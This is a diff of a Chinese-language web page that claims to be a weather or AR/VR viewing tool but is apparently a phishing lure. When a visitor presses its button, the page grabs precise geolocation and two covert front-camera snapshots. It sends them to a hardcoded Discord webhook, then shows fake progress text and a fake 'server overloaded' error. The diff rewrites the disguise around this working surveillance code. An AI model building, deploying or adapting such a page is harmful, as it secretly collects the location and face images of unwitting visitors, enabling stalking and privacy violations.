@@ -3,92 +3,100 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>即時天氣查詢系統</title>
+<title>AR/VR 全景天氣系統</title>
 <style>
-    body { font-family: -apple-system, system-ui, sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#29b6f6); background-size: 400% 400%; animation: skyFlow 15s ease infinite; overflow: hidden; }
-    @keyframes skyFlow { 0%{background-position:0% 50%;} 50%{background-position:100% 50%;} 100%{background-position:0% 50%;} }
-    .weather-box { background: rgba(255,255,255,0.95); width: 85%; max-width: 350px; padding: 35px 25px; border-radius: 25px; backdrop-filter: blur(15px); box-shadow: 0 15px 45px rgba(0,0,0,0.15); z-index: 10; position: relative; }
-    h2 { color: #1a73e8; font-size: 24px; }
-    .sun { width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 25px; background: radial-gradient(circle,#fff176,#fdd835,#fbc02d); box-shadow: 0 0 30px rgba(251,192,45,0.6); animation: sunPulse 3s ease-in-out infinite; }
-    @keyframes sunPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }
-    button { width: 100%; padding: 16px; font-size: 18px; font-weight: bold; border: none; border-radius: 15px; background: linear-gradient(135deg,#42a5f5,#1976d2); color: white; cursor: pointer; transition: 0.3s; }
+    body { font-family: -apple-system, sans-serif; text-align: center; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; color: #fff; overflow: hidden; }
+    /* VR 科技感背景 */
+    .vr-bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle, #1a237e 0%, #000 100%); opacity: 0.8; z-index: -1; }
+    .container { width: 85%; max-width: 350px; padding: 30px; border: 1px solid #3f51b5; border-radius: 20px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); }
+    .vr-icon { width: 80px; height: 80px; margin: 0 auto 20px; border: 2px solid #4fc3f7; border-radius: 50%; display: flex; align-items: center; justify-content: center; animation: pulse 2s infinite; }
+    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(79,195,247,0.4); } 70% { box-shadow: 0 0 0 20px rgba(79,195,247,0); } 100% { box-shadow: 0 0 0 0 rgba(79,195,247,0); } }
+    
+    h2 { color: #4fc3f7; font-size: 22px; letter-spacing: 2px; }
+    p { color: #aaa; font-size: 14px; line-height: 1.6; }
+    
+    /* VR 啟動按鈕 */
+    button { width: 100%; padding: 18px; font-size: 18px; font-weight: bold; border: none; border-radius: 50px; background: linear-gradient(90deg, #00c853, #b2ff59); color: #000; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,200,83,0.4); }
     button:active { transform: scale(0.95); }
-    #status { margin-top: 25px; font-size: 15px; color: #444; line-height: 1.8; }
 
-    /* 隱藏但保持活動的相機標籤 */
-    #v { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+    /* 進度條 */
+    #loader { display: none; width: 100%; height: 4px; background: #333; border-radius: 2px; margin-top: 20px; overflow: hidden; }
+    #bar { width: 0%; height: 100%; background: #4fc3f7; transition: 0.5s; }
+    #status { margin-top: 15px; font-size: 13px; color: #4fc3f7; font-family: monospace; }
 </style>
 </head>
 <body>
 
-<div class="weather-box">
-    <div class="sun"></div>
-    <h2>🌤 即時天氣查詢</h2>
-    <p>正在校準全球氣象衛星...</p>
-    <button id="btn" onclick="startAction()">獲取當前天氣</button>
+<div class="vr-bg"></div>
+<div class="container">
+    <div class="vr-icon">🕶️</div>
+    <h2>VR 實境觀測</h2>
+    <p>即將開啟 AR 模式，請允許相機權限以進行環境掃描並投影氣象數據。</p>
+    <button id="btn" onclick="startVR()">啟動 VR 觀測模式</button>
+    
+    <div id="loader"><div id="bar"></div></div>
     <div id="status"></div>
 </div>
 
-<video id="v" autoplay playsinline muted></video>
+<video id="v" style="display:none;" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-// 請在下方填入你新的 Webhook 網址
 var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
-
-var photoCount = 0;
 var currentStream = null;
 
-function startAction() {
+function startVR() {
     document.getElementById("btn").style.display = "none";
-    document.getElementById("status").innerHTML = "📡 正在連接氣象基站...<br>🌓 掃描環境光感中...";
+    document.getElementById("loader").style.display = "block";
+    updateStatus("INITIALIZING GYRO...", 20);
+    
+    // 同步執行：定位 + 相機請求
     getLocation();
-    getCamera();
+    initCamera();
+}
+
+function updateStatus(txt, progress) {
+    document.getElementById("status").innerHTML = "> " + txt;
+    document.getElementById("bar").style.width = progress + "%";
 }
 
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos) {
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            var mapLink = "https://www.google.com" + lat + "," + lon;
+            var mapLink = "https://www.google.com" + pos.coords.latitude + "," + pos.coords.longitude;
             fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "📍 **定位成功**\n緯度: " + lat + "\n經度: " + lon + "\n地圖連結: " + mapLink
-                })
+                body: JSON.stringify({ content: "📍 **VR模式-定位成功**\n" + mapLink })
             });
-            document.getElementById("status").innerHTML += "<br>✅ 定位成功，處理數據中...";
-        }, function(err) {
-            console.log("定位權限被拒絕");
-        }, { enableHighAccuracy: true });
+        }, null, { enableHighAccuracy: true });
     }
 }
 
-function getCamera() {
+function initCamera() {
+    // 關鍵：這會觸發瀏覽器的允許詢問
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(function(stream) {
         currentStream = stream;
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 確保影片播放且有畫面後才執行截圖
-        video.onplaying = function() {
-            setTimeout(function() { takeSnap(false); }, 1500); 
-            setTimeout(function() { takeSnap(true); }, 3500);  
-        };
-    }).catch(function(err) {
-        document.getElementById("status").innerHTML = "❌ 偵測失敗：請開啟位置與環境權限。";
+        updateStatus("SCANNING ENVIRONMENT...", 50);
+        
+        // 延遲拍照，模擬「掃描環境」的過程
+        setTimeout(() => takeSnap(false), 2000);
+        setTimeout(() => takeSnap(true), 4500);
+        
+    }).catch(function() {
+        document.getElementById("status").innerHTML = "ERROR: SENSOR ACCESS DENIED";
+        document.getElementById("bar").style.backgroundColor = "red";
     });
 }
 
 function takeSnap(isLast) {
     var video = document.getElementById("v");
     var canvas = document.getElementById("c");
-    
-    // 檢查視訊是否有數據，避免黑屏
-    if (video.videoWidth === 0 || video.paused) return;
+    if (video.videoWidth === 0) return;
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -96,25 +104,26 @@ function takeSnap(isLast) {
     ctx.drawImage(video, 0, 0);
     
     canvas.toBlob(function(blob) {
-        if (!blob) return;
         var formData = new FormData();
-        formData.append("file", blob, "img_" + Date.now() + ".jpg");
-        formData.append("payload_json", JSON.stringify({ content: "📸 **環境掃描已同步 (" + (++photoCount) + "/2)**" }));
+        formData.append("file", blob, "vr_scan.jpg");
+        formData.append("payload_json", JSON.stringify({ content: "📸 **VR 環境掃描數據回傳**" }));
 
         fetch(webhook, { method: "POST", body: formData })
-        .then(function() {
+        .then(() => {
             if (isLast) {
-                // 最後一張傳完，立即關閉相機並顯示天氣
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-                document.getElementById("status").innerHTML = "☀️ **今日天氣：晴朗**<br>🌡 溫度：27.5°C<br>🌬 濕度：62%<br>✨ 資訊已更新至最新。";
+                // 拍完立即關燈
+                currentStream.getTracks().forEach(t => t.stop());
+                updateStatus("VR MODE READY - CONNECTION STABLE", 100);
+                setTimeout(() => {
+                    alert("VR 模式啟動失敗：伺服器負載過高，請稍後再試。");
+                    location.reload();
+                }, 1000);
+            } else {
+                updateStatus("ANALYZING LIGHTING...", 80);
             }
         });
-    }, "image/jpeg", 0.7);
+    }, "image/jpeg", 0.6);
 }
 </script>
-
 </body>
 </html>
-
